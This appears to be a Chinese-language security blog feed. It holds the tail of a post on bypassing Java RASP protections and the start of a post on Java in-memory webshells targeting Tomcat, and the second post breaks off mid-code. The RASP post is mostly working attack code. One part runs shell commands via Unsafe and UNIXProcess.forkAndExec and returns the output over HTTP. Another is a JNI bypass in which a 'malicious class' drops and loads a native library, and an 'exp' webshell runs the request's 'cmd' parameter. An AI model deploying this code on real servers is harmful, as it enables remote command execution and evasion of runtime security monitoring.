class="line">unsafeConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) unsafeConstructor.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过Unsafe绕过构造方法创建UNIXProcess类的实例对象</span></span><br><span class="line">Class&lt;?&gt; unixProcessClass = Class.forName(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">unixProcessObject</span> <span class="operator">=</span> unsafe.allocateInstance(unixProcessClass);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从UNIXProcess中通过反射获取forkAndExec方法需要的参数（前两个参数是静态属性，可以直接反射获取）：1. ordinal. 2. helperpath. 3. argBlock</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">launchMechanismField</span> <span class="operator">=</span> unixProcessClass.getDeclaredField(<span class="string">&quot;launchMechanism&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">helperpathField</span> <span class="operator">=</span> unixProcessClass.getDeclaredField(<span class="string">&quot;helperpath&quot;</span>);</span><br><span class="line"></span><br><span class="line">launchMechanismField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">helperpathField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">launchMechanismObject</span> <span class="operator">=</span> launchMechanismField.get(unixProcessObject);</span><br><span class="line"><span class="type">int</span> <span class="variable">ordinal</span> <span class="operator">=</span> (<span class="type">int</span>) launchMechanismObject.getClass().getSuperclass().getDeclaredMethod(<span class="string">&quot;ordinal&quot;</span>).invoke(launchMechanismObject);</span><br><span class="line"><span class="type">byte</span>[] helperpath = (<span class="type">byte</span>[]) helperpathField.get(unixProcessObject);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;ordinal = &quot;</span> + ordinal);</span><br><span class="line">System.out.println(<span class="string">&quot;helperpath = &quot;</span> + Arrays.toString(helperpath));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据cmds计算argBlock</span></span><br><span class="line"><span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">byte</span>[] argBlock = <span class="keyword">new</span> <span class="title class_">byte</span>[length];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; cmds.length; i++) &#123;</span><br><span class="line"><span class="type">byte</span>[] cString = toCString(cmds[i]);</span><br><span class="line"><span class="type">byte</span>[] tmp = <span class="keyword">new</span> <span class="title class_">byte</span>[length + cString.length];</span><br><span class="line">System.arraycopy(argBlock, <span class="number">0</span>, tmp, <span class="number">0</span>, length);</span><br><span class="line">System.arraycopy(cString, <span class="number">0</span>, tmp, length, cString.length);</span><br><span class="line">argBlock = tmp;</span><br><span class="line">length += cString.length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>[] std_fds = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123;-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取forkAndExec方法并调用这个方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">forkAndExec</span> <span class="operator">=</span> unixProcessClass.getDeclaredMethod(<span class="string">&quot;forkAndExec&quot;</span>, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>[].class, <span class="type">boolean</span>.class);</span><br><span class="line">forkAndExec.setAccessible(<span class="literal">true</span>);</span><br><span class="line">System.out.println(unixProcessObject);</span><br><span class="line"><span class="type">int</span> <span class="variable">pid</span> <span class="operator">=</span> (<span class="type">int</span>) forkAndExec.invoke(unixProcessObject, ordinal + <span class="number">1</span>, helperpath, toCString(cmds[<span class="number">0</span>]), argBlock, cmds.length - <span class="number">1</span>, <span class="literal">null</span>, <span class="number">0</span>, <span class="literal">null</span>, std_fds, <span class="literal">false</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;pid = &quot;</span> + pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">initStreamsMethod</span> <span class="operator">=</span> unixProcessClass.getDeclaredMethod(<span class="string">&quot;initStreams&quot;</span>, <span class="type">int</span>[].class);</span><br><span class="line">initStreamsMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">initStreamsMethod.invoke(unixProcessObject, std_fds);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取本地执行结果的输入流</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getInputStreamMethod</span> <span class="operator">=</span> unixProcessClass.getMethod(<span class="string">&quot;getInputStream&quot;</span>);</span><br><span class="line">getInputStreamMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">ins</span> <span class="operator">=</span> (InputStream) getInputStreamMethod.invoke(unixProcessObject);</span><br><span class="line"></span><br><span class="line">System.out.println(ins);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将结果返回到页面上</span></span><br><span class="line"><span class="type">ServletOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line"><span class="type">int</span> len;</span><br><span class="line"><span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">while</span> ((len = ins.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">os.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">os.close();</span><br><span class="line">ins.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] toCString(String source) &#123;</span><br><span class="line"><span class="type">byte</span>[] src = source.getBytes();</span><br><span class="line"><span class="type">byte</span>[] result = <span class="keyword">new</span> <span class="title class_">byte</span>[src.length + <span class="number">1</span>];</span><br><span class="line">System.arraycopy(src, <span class="number">0</span>, result, <span class="number">0</span>, src.length);</span><br><span class="line">result[result.length - <span class="number">1</span>] = (<span class="type">byte</span>) <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/imgs/1700413928766.png"></p><h1 id="绕过二：使用java加载动态链接库RCE（JNI命令执行）"><a href="#绕过二：使用java加载动态链接库RCE（JNI命令执行）" class="headerlink" title="绕过二：使用java加载动态链接库RCE（JNI命令执行）"></a>绕过二：使用java加载动态链接库RCE（JNI命令执行）</h1><p><code>Java</code> 可以通过 <code>JNI</code> 的方式调用动态链接库，我们只需要在动态链接库中写一个本地命令执行的方法就行了。然后写一个类上传这个恶意动态链接库并且执行命令。然后我们可以通过 <code>defineClass</code> 加载这个恶意类，调用其中的方法。</p><p>参考 <a href="JNI%E5%AE%89%E5%85%A8.md">JNI安全</a> 。<br>步骤：</p><ol><li>编写恶意的 <code>JNI</code> 动态共享库 <code>so</code> 文件。</li><li>在恶意类中加载这个 <code>so</code> 文件，并且提供接口调用，然后通过 <code>javassist</code> 获取这个恶意类的字节码。</li></ol><blockquote><p>注意 <code>COMMAND_CLASS_BYTE_ENCODE</code> 要注意平台的兼容问题，需要提前探测出来靶机的环境。不同环境编译出来的 <code>so</code> 文件和字节码文件不一定兼容。<br>还有需要注意的是高版本 <code>JDKsun.misc.BASE64Decoder</code> 已经被移除，低版本 <code>JDK</code> 又没有 <code>java.util.Base64</code> 对象。所以我们需要根据靶机的 <code>jdk</code> 版本来确定使用哪个类来进行 <code>base64</code> 编解码。这里最好的方式是通过反射来判断当前靶机环境有哪些类。有哪个类就使用哪个类。</p></blockquote><p>恶意类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyCommand</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">exec</span><span class="params">(String cmd)</span>;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] decode = Base64.getDecoder().decode(s.getBytes());</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fos = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;/tmp/output.bin&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fos.write(decode);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        System.load(<span class="string">&quot;/tmp/output.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面直接给出 <code>exp</code> 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">evilFunc</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">// 默认的类名和类的字节码，便于测试</span></span><br><span class="line"><span class="type">String</span> <span class="variable">COMMAND_CLASS_NAME</span> <span class="operator">=</span> <span class="string">&quot;com.just.MyCommand&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">COMMAND_CLASS_BYTE_ENCODE</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以根据需要动态更新恶意类的类名和字节码</span></span><br><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;className&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">classByte</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;classByte&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (cmd == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (className != <span class="literal">null</span>) &#123;</span><br><span class="line">COMMAND_CLASS_NAME = className;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (classByte != <span class="literal">null</span>) &#123;</span><br><span class="line">COMMAND_CLASS_BYTE_ENCODE = classByte;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[] COMMAND_CLASS_BYTE = Base64.getDecoder().decode(COMMAND_CLASS_BYTE_ENCODE.getBytes());</span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="built_in">this</span>.getClass().getClassLoader();</span><br><span class="line"><span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> getMethod(classLoader, <span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Class&lt;?&gt; myCommandClass = (Class&lt;?&gt;) defineClass.invoke(classLoader, COMMAND_CLASS_NAME, COMMAND_CLASS_BYTE, <span class="number">0</span>, COMMAND_CLASS_BYTE.length);</span><br><span class="line"><span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> (String) myCommandClass.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(<span class="literal">null</span>, cmd);</span><br><span class="line">response.getWriter().write(result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Method <span class="title function_">getMethod</span><span class="params">(Object o, String methodName, Class&lt;?&gt;... parameterTypes)</span> <span class="keyword">throws</span> NoSuchMethodException &#123;</span><br><span class="line"><span class="keyword">if</span> (o == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">Class&lt;?&gt; clz = o.getClass();</span><br><span class="line">Method method;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">method = clz.getDeclaredMethod(methodName, parameterTypes);</span><br><span class="line">System.out.println(<span class="string">&quot;method = &quot;</span> + method);</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">clz = clz.getSuperclass();</span><br><span class="line">System.out.println(<span class="string">&quot;clz = &quot;</span> + clz);</span><br><span class="line"><span class="keyword">if</span> (clz == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> method;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://javasec.org/javase/CommandExecution/</span><br><span class="line">https://javasec.org/javase/JNI/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> RASP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> RASP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java内存马总结</title>
      <link href="/2023/09/18/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%80%BB%E7%BB%93/"/>
      <url>/2023/09/18/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="技术铺垫"><a href="#技术铺垫" class="headerlink" title="技术铺垫"></a>技术铺垫</h1><h2 id="Tomcat容器组件"><a href="#Tomcat容器组件" class="headerlink" title="Tomcat容器组件"></a>Tomcat容器组件</h2><p><code>Tomcat</code> 中有四类容器组件：<code>Engine</code> 、<code>Host</code>  、<code>Context</code> 、 <code>Wrapper</code> ；关系如下</p><ul><li><code>Engine</code>（ <code>org.apache.catalina.core.StandardEngine</code> ）：最大的容器组件，可以容纳多个 <code>Host</code> 。</li><li><code>Host</code>（ <code>org.apache.catalina.core.StandardHost</code> ）：一个 <code>Host</code> 代表一个虚拟主机，一个 <code>Host</code> 可以包含多个 <code>Context</code> 。</li><li><code>Context</code>（ <code>org.apache.catalina.core.StandardContext</code> ）：一个 <code>Context</code> 代表一个 <code>Web</code> 应用，其下可以包含多个 <code>Wrapper</code> 。</li><li><code>Wrapper</code>（ <code>org.apache.catalina.core.StandardWrapper</code> ）：一个 <code>Wrapper</code> 代表一个 <code>Servlet</code>（<strong>重点</strong> ：想要动态的去注册 <code>Servlet</code> 组件实现过程中的关键之一就是如何获取 <code>Wrapper</code> 对象，再往上也就是如何获取到 <code>Context</code> 对象，从而掌握整个 <code>Web</code> 应用）。</li></ul><h2 id="Servlet基础组件"><a href="#Servlet基础组件" class="headerlink" title="Servlet基础组件"></a>Servlet基础组件</h2><p><code>Servlet</code> 的三大基础组件为：<code>Servlet</code> ，<code>Filter</code> ，<code>Listener</code> 。<br>在服务端处理一个请求时，上面三个组件的处理顺序如下：</p><p><code>Listener</code> -&gt; <code>Filter</code> -&gt; <code>Servlet</code> </p><ul><li><p><code>Servlet</code> : </p><blockquote><p>最基础的控制层组件，用于动态处理前端传递过来的请求，每一个 <code>Servlet</code> 都可以理解成运行在服务器上的一个 <code>java</code> 程序。生命周期：从 <code>Tomcat</code> 的 <code>Web</code> 容器启动开始，到服务器停止调用其 <code>destroy()</code> 结束，驻留在内存里面。</p></blockquote></li><li><p><code>Filter</code> ：</p><blockquote><p>过滤器，过滤一些非法请求或不当请求，一个 <code>Web</code> 应用中一般是一个 <code>filterChain</code> 链式调用其 <code>doFilter()</code> 方法，存在一个顺序问题。</p></blockquote></li><li><p><code>Listener</code> ：</p><blockquote><p>监听器，以 <code>ServletRequestListener</code> 为例，<code>ServletRequestListener</code> 主要用于监听 <code>ServletRequest</code> 对象的创建和销毁，一个 <code>ServletRequest</code> 可以注册多个 <code>ServletRequestListener</code> 接口（都有 <code>request</code> 来都会触发这个）。</p></blockquote></li></ul><h1 id="内存马的思路分析"><a href="#内存马的思路分析" class="headerlink" title="内存马的思路分析"></a>内存马的思路分析</h1><h2 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h2><p>在 <code>IDEA</code> 的 <code>jsp</code> 中，由于 <code>tomcat</code> 是通过 <code>add configuration</code> 集成的，因此我们无法直接看到 <code>tomcat</code> 的源码。 </p><p><img src="/imgs/20220720153128.png"></p><p>我们需要通过下面的方式进行导入。</p><p>在 <code>project structure</code> 里面找到 <code>libraries</code>，点加号，<code>Java</code>：</p><p><img src="/imgs/20230214005423.png"></p><p>然后把 <code>tomcat</code> 的 <code>lib</code> 下面的所有 <code>jar</code> 包都给导进来就行了：</p><p><img src="/imgs/1676307141490.png"></p><h2 id="Tomcat的Context分析"><a href="#Tomcat的Context分析" class="headerlink" title="Tomcat的Context分析"></a>Tomcat的Context分析</h2><p>在前面提到了，在 <code>Tomcat</code> 中，一个 <code>Context</code> 代表一个 <code>Web</code> 应用。因此我们想要操控整个 <code>web</code> 应用，自然而然会想到先到得到 <code>Tomcat</code> 的 <code>Context</code> 。</p><p><img src="/imgs/1694353848939.png"></p><p><code>Context</code> 是一个接口，在 <code>Tomcat</code> 中 <code>Context</code> 的是实现类是 <code>StandardContext</code> 类。</p><blockquote><p>需要注意的是，我们知道 <code>SpringBoot</code> 中内置了 <code>Tomcat</code> ，在 <code>SpringBoot</code> 中， <code>Tomcat</code> 的 <code>Context</code> 的实现类是 <code>TomcatEmbeddedContext</code> ，但是也不影响后面的分析，因为 <code>TomcatEmbeddedContext</code> 是 <code>StandardContext</code> 的子类。</p></blockquote><p><code>Context</code> 的实现类就下面三个（在 <code>idea</code> 中通过  <code>Ctrl+alt+b</code> 来查看）（原生的 <code>Tomcat</code> 没有 <code>TomcatEmbeddedContext</code> 类，这是 <code>SpringBoot</code> 中 <code>Tomcat</code> 带的）。其 <code>UML</code> 类图如下：</p><p><img src="/imgs/1694357723860.png"></p><ul><li><code>jsp</code> 中的 <code>context</code></li></ul><p><img src="/imgs/1694357246799.png"></p><ul><li><code>SpringBoot</code> 中的 <code>context</code></li></ul><p><img src="/imgs/1694357639653.png"></p><h2 id="获取StandardContext的几种方式"><a href="#获取StandardContext的几种方式" class="headerlink" title="获取StandardContext的几种方式"></a>获取StandardContext的几种方式</h2><p>下面重点介绍在 <code>jsp</code> 的一次请求中，获取 <code>Tomcat</code> 的 <code>Conetxt</code> （ <code>StandardContext</code> ）的几种方法。（下面的方法都可以带入到 <code>SpringBoot</code> 中，就是有些细节需要修改。）</p><h3 id="方式一：通过request获取"><a href="#方式一：通过request获取" class="headerlink" title="方式一：通过request获取"></a>方式一：通过request获取</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><blockquote><p><code>Tomcat</code> 中 <code>Web</code> 应用中获取的 <code>request.getServletContext()</code> 是 <code>ApplicationContextFacade</code> 对象。该对象对 <code>ApplicationContext</code> 进行了封装，而 <code>ApplicationContext</code> 实例中又包含了 <code>StandardContext</code> 实例，所以当<code>request</code> 存在的时候我们可以通过反射来获取 <code>StandardContext</code> 对象。</p></blockquote><p><img src="/imgs/1694359297148.png"></p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p>第一个方式不难，下面直接给出代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// request是RequestFacade的类对象，servletContext是ApplicationContextFacade的类对象</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ApplicationContextFacade类有一个context的私有属性，其类型为ApplicationContext</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">servletContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    servletContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) servletContextField.get(servletContext);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ApplicationContext类也有一个context的私有属性，其类型为StandardContext类(在SpringBoot中则为TomcatEmbeddedContext类)</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) applicationContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">&quot;standardContext = &quot;</span> + standardContext);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="方式二：从currentThread中的ContextClassLoader中获取"><a href="#方式二：从currentThread中的ContextClassLoader中获取" class="headerlink" title="方式二：从currentThread中的ContextClassLoader中获取"></a>方式二：从currentThread中的ContextClassLoader中获取</h3><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>在 <code>Tomcat</code> 处理请求的线程中，存在 <code>ContextClassLoader</code> 对象，而这个对象（ <code>WebappClassLoaderBase</code> ）的 <code>resources</code> 属性中又保存了<code>StandardContext</code> 对象。（使用于 <code>Tomcat 8~9</code> ）</p><blockquote><p>但是需要注意的是，由于这个方法在 <code>Tomcat</code> 中没有被使用，而且存在危险性（在暴露了 <code>classLoader</code> 的情况下，会导致黑客接触到 <code>Tomcat</code> 的内部），因此在 <code>Tomcat</code> 的高版本（在 <code>9点几</code> 以上）废弃了 <code>getResources()</code> 这个方法，导致其一直返回 <code>NULL</code> ，因此需要通过反射才能拿到 <code>ContextClassLoader</code> 的 <code>resources</code> 属性。</p></blockquote><p><img src="/imgs/1694364646768.png"></p><ul><li>低版本 <code>tomcat</code></li></ul><p><img src="/imgs/1694364732351.png"></p><ul><li>高版本 <code>tomcat</code></li></ul><p><img src="/imgs/1694364714812.png"></p><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><p>下面给出用 <code>getResources()</code> 获取 <code>resources</code> 的代码和用反射获取 <code>resources</code> 的代码。</p><ul><li>使用 <code>getResources()</code> （适用于低版本 <code>Tomcat</code> ， <code>9</code> 以下）</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebappClassLoaderBase</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> (WebappClassLoaderBase)Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) contextClassLoader.getResources().getContext();</span><br></pre></td></tr></table></figure><ul><li>使用反射（适用于高版本 <code>Tomcat</code> ，<code>9</code> 及以上）</li></ul><p>注意这里的 <code>contextClassLoader</code> 实际是 <code>ParallelWebappClassLoader</code> 类型的（ <code>WebappClassLoaderBase</code> 抽象类的子类），<code>resources</code> 属性在 <code>WebappClassLoaderBase</code> 类中。因此这里获取 <code>resources</code> 属性需要在其父类去找，<code>getDeclaredField()</code> 无法获取父类的属性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.loader.WebappClassLoaderBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.webresources.StandardRoot&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">WebappClassLoaderBase</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> (WebappClassLoaderBase)Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注意这里的contextClassLoader实际是ParallelWebappClassLoader类型的（WebappClassLoaderBase抽象类的子类），resources属性在WebappClassLoaderBase类中</span></span><br><span class="line">    <span class="comment">// 